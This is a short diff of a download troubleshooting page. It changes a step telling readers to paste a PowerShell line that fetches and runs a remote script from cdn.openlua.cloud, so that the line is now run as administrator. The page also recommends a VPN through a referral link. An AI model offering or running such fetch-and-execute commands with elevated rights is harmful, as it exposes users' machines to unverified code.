@@ -158,7 +158,7 @@ Retry the download a few times. If it doesn't work anyways, copy the line below:
 ```powershell
 irm -useb cdn.openlua.cloud/fix-download.ps1 | iex
 ```
-open PowerShell, paste the line you've copied and press Enter. Wait until the proccess finishes.
+open PowerShell as administrator, paste the line you've copied and press Enter. Wait until the proccess finishes.
 
 :::note
 If you get a red error right after pressing Enter, use a VPN. We recommend [Surfshark](https://surfshark.club/friend/2m7WDRXV).
